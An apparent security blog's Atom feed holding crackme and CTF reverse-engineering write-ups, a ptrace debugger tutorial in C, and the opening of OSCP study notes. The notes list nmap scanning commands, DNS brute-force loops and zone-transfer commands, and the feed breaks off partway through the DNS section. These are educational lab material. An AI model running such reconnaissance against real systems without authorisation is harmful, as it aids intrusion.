<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-03-08T13:20:29-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Nihaal Prasad</title><subtitle></subtitle><entry><title type="html">Cracking Silva97’s login-cipher</title><link href="http://localhost:4000/2020/02/27/cracking-Silva97-login-cipher.html" rel="alternate" type="text/html" title="Cracking Silva97's login-cipher" /><published>2020-02-27T00:00:00-05:00</published><updated>2020-02-27T00:00:00-05:00</updated><id>http://localhost:4000/2020/02/27/cracking-Silva97-login-cipher</id><content type="html" xml:base="http://localhost:4000/2020/02/27/cracking-Silva97-login-cipher.html">&lt;p&gt;Today, I am going to show you how I reverse engineered &lt;a href=&quot;https://crackmes.one/crackme/5db0ef9f33c5d46f00e2c729&quot;&gt;this binary&lt;/a&gt; and cracked the password.  First, when we run the program, we can see that the program is asking us to input a password. If we input the incorrect password, the program says, “Wrong!”&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-27-cracking-Silva97-login-cipher/output.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is what the main function looks like in Ghidra. Note that I renamed some variables/functions so that the code can be easier to read.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-27-cracking-Silva97-login-cipher/main.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There’s some interesting stuff happening here. First of all, the print() function will take an encrypted string, decrypt it, and print it out. The encryption appears to be some sort of modified caesar cipher, but I’m not going to go too in depth into this function because it does not matter. The important thing to note is that the line that says&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;uVar1 = check_input(input,&quot;fhz4yhx|~g=5&quot;);&quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;will check whether the given input is correct or not. If the input is correct, the check_input() function will return 0, else, it will return 1 (this can be figured out by stepping over the function in a debugger using an input value that we know is incorrect). Clearly, our goal here is to figure out what input value makes the check_input() function return 0.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-27-cracking-Silva97-login-cipher/check_input.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The second parameter to the check_input() function contains the correct input, but in an encrypted form. The gen_character() function will decrypt the input and return a single character, and successive calls to gen_character() using 0 as the input will return the next decrypted character. The while loop in the middle of the code will check whether each input character is equal to the decrypted character that gen_character() returned. Since we now know where the correct input is being decrypted in the code, all we have to do is set a breakpoint right after the gen_character() function is executed and look at it’s return value.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-27-cracking-Silva97-login-cipher/first_value.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I used radare2 to step over the first call to the gen_character() function. The decrypted character is 0x63, which is returned in rax. Next, I set rip equal to the second call to the gen_character() function using “dr rip = 0x55f90fc16409”, and I stepped over that line of code to figure out what the next decrypted character is. This also ended being 0x63.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-27-cracking-Silva97-login-cipher/next_value.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I once again set rip to the gen_character() function and stepped over that line of code to figure out the next decrypted character, and I repeated these steps until I figured out what all of the decrypted characters were, which are shown below:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x63, 0x63, 0x73, 0x2d, 0x70, 0x61, 0x73, 0x73, 0x77, 0x64, 0x34, 0x34, 0x00
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I assumed 0x00 indicated that this was the end of the string and stopped after seeing it. I sent over these values to the program using python, and I was able to crack the puzzle.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python -c &quot;print('\x63\x63\x73\x2d\x70\x61\x73\x73\x77\x64\x34\x34')&quot; | ./login
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-27-cracking-Silva97-login-cipher/cracked.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;section class=&quot;related&quot;&gt;
  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
  &lt;ul class=&quot;post-list&quot;&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/02/27/creating-a-barebones-debugger.html&quot;&gt;
          Creating a Barebones Debugger
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/02/22/reversing-buildString-program.html&quot;&gt;
          Reversing the buildString CTF challenge
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/02/21/cracking-d4rkfl0w-crackme-4.html&quot;&gt;
          Cracking D4RKFL0W's Crackme-4
        &lt;/a&gt;
      &lt;/li&gt;
    
  &lt;/ul&gt;
&lt;/section&gt;</content><author><name></name></author><summary type="html">Today, I am going to show you how I reverse engineered this binary and cracked the password. First, when we run the program, we can see that the program is asking us to input a password. If we input the incorrect password, the program says, “Wrong!”</summary></entry><entry><title type="html">Creating a Barebones Debugger</title><link href="http://localhost:4000/2020/02/27/creating-a-barebones-debugger.html" rel="alternate" type="text/html" title="Creating a Barebones Debugger" /><published>2020-02-27T00:00:00-05:00</published><updated>2020-02-27T00:00:00-05:00</updated><id>http://localhost:4000/2020/02/27/creating-a-barebones-debugger</id><content type="html" xml:base="http://localhost:4000/2020/02/27/creating-a-barebones-debugger.html">&lt;p&gt;Today, I will be showing how I created a basic debugger in C. This won’t be a very complicated debugger as it will only allow you to do three things: see the values of the registers, step through one instruction, and read hex values from memory. Obviously, this is nothing compared to something like IDA Pro, but making a basic debugger did help me understand what the debugger is actually doing when we are using it.&lt;/p&gt;

&lt;p&gt;The first thing that we need to do is to run the program we want to debug in a separate process using fork(). The program’s name will be given as a command line argument to our debugger, and any additional arguments that we want to past to the program we are currently debugging can also be passed as arguments. Once we call fork() to make a copy of this process, we will make the child process call &lt;code class=&quot;highlighter-rouge&quot;&gt;ptrace(PTRACE_TRACEME, 0, 0, 0);&lt;/code&gt;, which will let the child process know that it is going to be debugged by the parent process. The &lt;code class=&quot;highlighter-rouge&quot;&gt;ptrace()&lt;/code&gt; function will be used throughout our code as it allows the parent process to control and observe the child process. From there, we will use execv() to actually execute the program that we want to execute. As soon as this happens, the tracee (the program being debugged) stop pause execution on a SIGTRAP, which will be used to prevent the tracee from executing any more code unless the tracer/debugger allows it.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Represents the PID of the program being debugged
static int pid = 0;

// Forks this process, runs the given executable using the given arguments, and returns the PID to the parent
int run(char **argv) {
    pid = fork();

    // If statement will only execute if we are the child process
    if(pid == 0) {
        ptrace(PTRACE_TRACEME, 0, 0, 0); // Allow the parent to trace us
        execv(argv[1], &amp;amp;(argv[2])); // Execute the program we wanted to execute.
        // The tracee should stop on SIGTRAP as soon as execv() is called.
        // This will prevent the tracee from executing any code unless the tracer allows it to using ptrace()
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, the child process has the program that we want to debug loaded up into it, and it has paused execution so that we can start to take control of it as its parent process. Inside our main function, we need to obtain the program that we must run from the command line arguments and call run(). Then we will also use &lt;code class=&quot;highlighter-rouge&quot;&gt;ptrace(PTRACE_SETOPTIONS, pid, 0, PTRACE_O_EXITKILL);&lt;/code&gt; on the parent process so that if the parent exits, then the child process must also exit.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Main function
int main(int argc, char **argv) {
    // Make sure we have the correct number of arguments
    if(argc != 2) {
        printf(&quot;Usage: ./debug &amp;lt;program&amp;gt; &amp;lt;additional arguments&amp;gt;\n&quot;);
        exit(0);
    }

    run(argv); // Run the given executable and obtain its PID
    ptrace(PTRACE_SETOPTIONS, pid, 0, PTRACE_O_EXITKILL); // Make sure that if the tracer exits, then the tracee must also exit
    debugger(pid); // Run the debugger
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The debugger() function is a function that I made to help me process commands inputted by the user. It will parse the command the user types in and calls the correct function to do the action that the user requested. I also made a print_help() function that will print out all of the possible commands that can be used.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Reads a line of input
void readline(char *input) {
    // Reads a line of input
    char buf[500];
    printf(&quot;&amp;gt; &quot;);
    fgets(input, 500, stdin);

    // Get rid of the '\n' character
    int len = strlen(input);
    if(len &amp;gt;= 2 &amp;amp;&amp;amp; input[len-1] == '\n') {
        input[len-1] = '\0';
    }
}

// Prints the help menu
void print_help() {
    printf(&quot;regs: Prints out the values of each register.\n&quot;);
    printf(&quot;step: Executes a single instruction.\n&quot;);
    printf(&quot;mem &amp;lt;addr&amp;gt;: Reads the value at the given memory address.\n&quot;);
    printf(&quot;quit: Closes the debugger.\n&quot;);
}

// Actual debugger code
void debugger() {
    char *input = malloc(500); // Input that the user types in

    // Loop until the user types in &quot;exit&quot;
    do {
        readline(input); // Read a command

        // Parse the command
        if(strncmp(&quot;regs&quot;, input, 5) == 0 || strncmp(&quot;r&quot;, input, 2) == 0) {
            print_regs();
        } else if(strncmp(&quot;step&quot;, input, 5) == 0 || strncmp(&quot;s&quot;, input, 2) == 0) {
            step();
        } else if(strncmp(&quot;mem &quot;, input, 4) == 0) {
            strtok(input, &quot; &quot;); // Mem should have a single input parameter, which is the memory address to read in hex
            read_mem(strtok(NULL, &quot; &quot;));
        } else if(strncmp(&quot;help&quot;, input, 5) == 0 || strncmp(&quot;h&quot;, input, 2) == 0) {
            print_help();
        }
    } while(strncmp(input, &quot;exit&quot;, 5) &amp;amp;&amp;amp; strncmp(input, &quot;quit&quot;, 5) &amp;amp;&amp;amp; strncmp(input, &quot;q&quot;, 2));
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The first thing that I will show you how to do is how to read the values of the registers in the debugged program. We will be using the &lt;code class=&quot;highlighter-rouge&quot;&gt;ptrace(PTRACE_GETREGS, pid, 0, &amp;amp;regs)&lt;/code&gt; function to read the values of the registers in the debugged program. The “regs” variable that we’ll use as an input parameter for this function has a type of &lt;code class=&quot;highlighter-rouge&quot;&gt;struct user_regs_struct&lt;/code&gt;, and the ptrace() function will store the values of the registers inside of that variable. The values of the registers can then be easily read by using the regs variable (i.e. use &lt;code class=&quot;highlighter-rouge&quot;&gt;regs.rax&lt;/code&gt; to read the value of rax).&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Prints out all of the register values inside of the process we're debugging
void print_regs() {
    // Create the struct that will contain all of the process' registers
    struct user_regs_struct regs;

    // Read the values of each register and store it inside of the struct
    ptrace(PTRACE_GETREGS, pid, 0, &amp;amp;regs);

    // Print out each value
    printf(&quot;rip 0x%llx\n&quot;, regs.rip);
    printf(&quot;rax 0x%llx\n&quot;, regs.rax);
    printf(&quot;rbx 0x%llx\n&quot;, regs.rbx);
    printf(&quot;rcx 0x%llx\n&quot;, regs.rcx);
    printf(&quot;rdx 0x%llx\n&quot;, regs.rdx);
    printf(&quot;rsi 0x%llx\n&quot;, regs.rsi);
    printf(&quot;rdi 0x%llx\n&quot;, regs.rdi);
    printf(&quot;rsp 0x%llx\n&quot;, regs.rsp);
    printf(&quot;rbp 0x%llx\n&quot;, regs.rbp);
    printf(&quot;r8 0x%llx\n&quot;, regs.r8);
    printf(&quot;r9 0x%llx\n&quot;, regs.r9);
    printf(&quot;r10 0x%llx\n&quot;, regs.r10);
    printf(&quot;r11 0x%llx\n&quot;, regs.r11);
    printf(&quot;r12 0x%llx\n&quot;, regs.r12);
    printf(&quot;r13 0x%llx\n&quot;, regs.r13);
    printf(&quot;r14 0x%llx\n&quot;, regs.r14);
    printf(&quot;r15 0x%llx\n&quot;, regs.r15);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To read any word from memory, we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;ptrace(PTRACE_PEEKDATA, pid, addr, 0)&lt;/code&gt;, where addr is a long representing the address that we want to read from. This function will return a long variable that we can then print out in hex.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Reads the value at the given memory address
void read_mem(char *addr_input) {
    // Make sure that the input isn't NULL
    if(addr_input != NULL) {
        long addr = strtol(addr_input, 0, 16); // Convert the address from a hex string to a long
        long data = ptrace(PTRACE_PEEKDATA, pid, addr, 0); // Obtain the data
        printf(&quot;%lx\n&quot;, data);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Stepping through a single line of assembly code is even easier. We can just call &lt;code class=&quot;highlighter-rouge&quot;&gt;ptrace(PTRACE_SINGLESTEP, pid, 0, 0);&lt;/code&gt;, which will just execute one line of code.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Steps through a single line of assembly code
void step() {
    ptrace(PTRACE_SINGLESTEP, pid, 0, 0);
}

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we should have a working debugger. You can try using this to debug a basic program, and it should work just fine.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./debug todebug
&amp;gt; help
regs: Prints out the values of each register.
step: Executes a single instruction.
mem &amp;lt;addr&amp;gt;: Reads the value at the given memory address.
quit: Closes the debugger.
&amp;gt; regs
rip 0x7fcfb2eee090
rax 0x0
rbx 0x0
rcx 0x0
rdx 0x0
rsi 0x0
rdi 0x0
rsp 0x7fff2e69c670
rbp 0x0
r8 0x0
r9 0x0
r10 0x0
r11 0x0
r12 0x0
r13 0x0
r14 0x0
r15 0x0
&amp;gt; mem 0x7fcfb2eee090
f98e8e78948
&amp;gt; step
&amp;gt; r
rip 0x7fcfb2eee093
rax 0x0
rbx 0x0
rcx 0x0
rdx 0x0
rsi 0x0
rdi 0x7fff2e69c670
rsp 0x7fff2e69c670
rbp 0x0
r8 0x0
r9 0x0
r10 0x0
r11 0x0
r12 0x0
r13 0x0
r14 0x0
r15 0x0
&amp;gt; q
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;section class=&quot;related&quot;&gt;
  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
  &lt;ul class=&quot;post-list&quot;&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/02/27/cracking-Silva97-login-cipher.html&quot;&gt;
          Cracking Silva97's login-cipher
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/02/22/reversing-buildString-program.html&quot;&gt;
          Reversing the buildString CTF challenge
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/02/21/cracking-d4rkfl0w-crackme-4.html&quot;&gt;
          Cracking D4RKFL0W's Crackme-4
        &lt;/a&gt;
      &lt;/li&gt;
    
  &lt;/ul&gt;
&lt;/section&gt;</content><author><name></name></author><summary type="html">Today, I will be showing how I created a basic debugger in C. This won’t be a very complicated debugger as it will only allow you to do three things: see the values of the registers, step through one instruction, and read hex values from memory. Obviously, this is nothing compared to something like IDA Pro, but making a basic debugger did help me understand what the debugger is actually doing when we are using it.</summary></entry><entry><title type="html">Reversing the buildString CTF challenge</title><link href="http://localhost:4000/2020/02/22/reversing-buildString-program.html" rel="alternate" type="text/html" title="Reversing the buildString CTF challenge" /><published>2020-02-22T00:00:00-05:00</published><updated>2020-02-22T00:00:00-05:00</updated><id>http://localhost:4000/2020/02/22/reversing-buildString-program</id><content type="html" xml:base="http://localhost:4000/2020/02/22/reversing-buildString-program.html">&lt;p&gt;Earlier today, I had gone to VMI’s 2020 Cyberfusion CTF with my college’s CTF team (we won first place!), and I’m going to show how I solved one of their reverse engineering challenges. I was given a binary file called &lt;a href=&quot;../../../assets/other/2020-2-22-reversing-buildString-program/buildString&quot;&gt;buildString&lt;/a&gt;, and upon executing the file, I was greeted with the following output.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-22-reversing-buildString-program/output.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I used r2ghidra to decompile the main function, and it is clear that there is a lot going on here.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-22-reversing-buildString-program/main.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Essentially, the program is trying to generate a string using a strange algorithm that obfuscates what the string is. It took longer then I want to admit to figure out what I was supposed to do, but I eventually found out that the most important part to reversing this binary lies in the end of the main function, where another function called finalAssembly() is being called.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-22-reversing-buildString-program/main_end.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I set a breakpoint at this function and took a look around. There are two function calls at the very beginning that are, presumably, being used to generate the string. I stepped over the two function calls and printed out the value of rdi, which happened to be “ZmxhZ3tFQHp5X1AzM3p5X2xlbW9uc3EzM3p5fQ==”.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-22-reversing-buildString-program/finalAssembly.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After base64 decoding this value, I obtained the flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-22-reversing-buildString-program/flag.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;section class=&quot;related&quot;&gt;
  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
  &lt;ul class=&quot;post-list&quot;&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/02/27/creating-a-barebones-debugger.html&quot;&gt;
          Creating a Barebones Debugger
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/02/27/cracking-Silva97-login-cipher.html&quot;&gt;
          Cracking Silva97's login-cipher
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/02/21/cracking-d4rkfl0w-crackme-4.html&quot;&gt;
          Cracking D4RKFL0W's Crackme-4
        &lt;/a&gt;
      &lt;/li&gt;
    
  &lt;/ul&gt;
&lt;/section&gt;</content><author><name></name></author><summary type="html">Earlier today, I had gone to VMI’s 2020 Cyberfusion CTF with my college’s CTF team (we won first place!), and I’m going to show how I solved one of their reverse engineering challenges. I was given a binary file called buildString, and upon executing the file, I was greeted with the following output.</summary></entry><entry><title type="html">Cracking D4RKFL0W’s Crackme-4</title><link href="http://localhost:4000/2020/02/21/cracking-d4rkfl0w-crackme-4.html" rel="alternate" type="text/html" title="Cracking D4RKFL0W's Crackme-4" /><published>2020-02-21T00:00:00-05:00</published><updated>2020-02-21T00:00:00-05:00</updated><id>http://localhost:4000/2020/02/21/cracking-d4rkfl0w-crackme-4</id><content type="html" xml:base="http://localhost:4000/2020/02/21/cracking-d4rkfl0w-crackme-4.html">&lt;p&gt;Today, I will be going over how I cracked &lt;a href=&quot;https://crackmes.one/crackme/5e0fa43b33c5d419aa01351e&quot;&gt;this crackme&lt;/a&gt;. When I first executed the program, it started off by asking me to enter some password, so it is clear that our goal here is to figure out what this password is.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-21-cracking-d4rkfl0w-crackme-4/execution.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I opened up this binary in radare2 and saw that the main function was calling another function called prompt().&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-21-cracking-d4rkfl0w-crackme-4/main.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I stepped into this function and saw that this function would print out “Please enter the password:” and read a line of input. There was another interesting function called Vault::checkPassword() being called near the end of the function.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-21-cracking-d4rkfl0w-crackme-4/prompt.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I stepped into Vault::checkPassword(). It seems as though this function calls another function called PasswordGen::buildPassword(), which probably builds the password, and then calls PasswordGen::checkPassword(), which is the function that we care about the most. If the password looks good, then it will print out a message stating that it is the correct password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-21-cracking-d4rkfl0w-crackme-4/checkPasswordVault.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Inside of Vault::checkPassword(), there are function calls to c3(), c0(), c1(), c2(), c4(), c8(), c5(), c6(), and c7(). Each of these function calls generate and return one of the characters for the password, and the correct index of each character is indicated by the number coming after c (i.e., c3() returns the 3rd character of the password, c0() returns the 0th character of the password, etc.). After each function call, the corresponding character for the user’s input is checked against the character that was generated, and if the input does not equal the character, the program exits.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-21-cracking-d4rkfl0w-crackme-4/checkPasswordGen.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I set a breakpoint right after c3() executes, and I recorded the value of rax, which was 3a.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-21-cracking-d4rkfl0w-crackme-4/c3.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I repeated this by setting breakpoints right after the other function calls to c0(), c1(), c2(), c4(), c8(), c5(), c6(), and c7(), and I continued to record the values of rax. These were the results:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c3(): rax = 0x3a
c0(): rax = 0x55
c1(): rax = 0x36
c2(): rax = 0x2d
c4(): rax = 0x59
c8(): rax = 0x2b
c5(): rax = 0x4c
c6(): rax = 0x2e
c7(): rax = 0x22
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I had recreated all of the correct values for the password. Now all I had to do was to reorder the password values so that the 0th value comes first and the 8th value comes last and send the input using the below command.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python -c &quot;print('\x55\x36\x2d\x3a\x59\x4c\x2e\x22\x2b')&quot; | ./Crackme-4
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-21-cracking-d4rkfl0w-crackme-4/correct.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;section class=&quot;related&quot;&gt;
  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
  &lt;ul class=&quot;post-list&quot;&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/02/27/creating-a-barebones-debugger.html&quot;&gt;
          Creating a Barebones Debugger
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/02/27/cracking-Silva97-login-cipher.html&quot;&gt;
          Cracking Silva97's login-cipher
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/02/22/reversing-buildString-program.html&quot;&gt;
          Reversing the buildString CTF challenge
        &lt;/a&gt;
      &lt;/li&gt;
    
  &lt;/ul&gt;
&lt;/section&gt;</content><author><name></name></author><summary type="html">Today, I will be going over how I cracked this crackme. When I first executed the program, it started off by asking me to enter some password, so it is clear that our goal here is to figure out what this password is.</summary></entry><entry><title type="html">Useful OSCP Notes</title><link href="http://localhost:4000/2020/02/06/useful-oscp-notes.html" rel="alternate" type="text/html" title="Useful OSCP Notes" /><published>2020-02-06T00:00:00-05:00</published><updated>2020-02-06T00:00:00-05:00</updated><id>http://localhost:4000/2020/02/06/useful-oscp-notes</id><content type="html" xml:base="http://localhost:4000/2020/02/06/useful-oscp-notes.html">&lt;p&gt;I have been studying for the OSCP for a little less than two months. I was studying 5-7 hours per day during my winter break, and I’ve learned a lot since I began. At the time of writing this blog post, my exam is in a week, and I just wanted to put down some of my notes that I’ve been using into a blog post. These notes mainly contain commands that I have been using throughout the PWK labs.&lt;/p&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;p&gt;Ping Scan:
&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sn [IP addresses]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Search for specific port:
&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -p [port] [IP addresses]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;OS Fingerprinting:
&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -O [IP address]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Banner Grabbing:
&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT [IP addresses]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Connect to SMB and determine OS:
&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap [IP address] --script smb-os-discovery.nse&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;DNS Zone Transfer:
&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap --script=dns-zone-transfer -p 53 [target]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;FTP Bounce Scan:
&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -p- -b anonymous@[FTP Server] [target] -Pn&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;List of NSE scripts that could be used for vulnerability scanning:
&lt;code class=&quot;highlighter-rouge&quot;&gt;ls -l /usr/share/nmap/scripts/*vuln*&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;www.stationx.net/nmap-cheat-sheet/&quot;&gt;Link to a more in-depth Nmap quide&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;dns&quot;&gt;DNS&lt;/h3&gt;
&lt;p&gt;Finding name servers:
&lt;code class=&quot;highlighter-rouge&quot;&gt;host -t ns example.com&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Finding mail servers:
&lt;code class=&quot;highlighter-rouge&quot;&gt;host -t mx example.com&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Looking up an IP address:
&lt;code class=&quot;highlighter-rouge&quot;&gt;host example.com&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Brute force IP addresses given a list of possible names:
&lt;code class=&quot;highlighter-rouge&quot;&gt;for ip in $(cat list.txt); do host $ip.example.com;done | grep -v &quot;not found&quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Brute force domain names given list of possible IP addresses:
&lt;code class=&quot;highlighter-rouge&quot;&gt;for ip in $(seq 155 190);do host xxx.xxx.xxx.$ip;done | grep -v &quot;not found&quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Zone Transfer:
&lt;code class=&quot;highlighter-rouge&quot;&gt;host -l example.com [name server]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Script that automatically checks each DNS server and does a zone transfer:&lt;/p&gt;

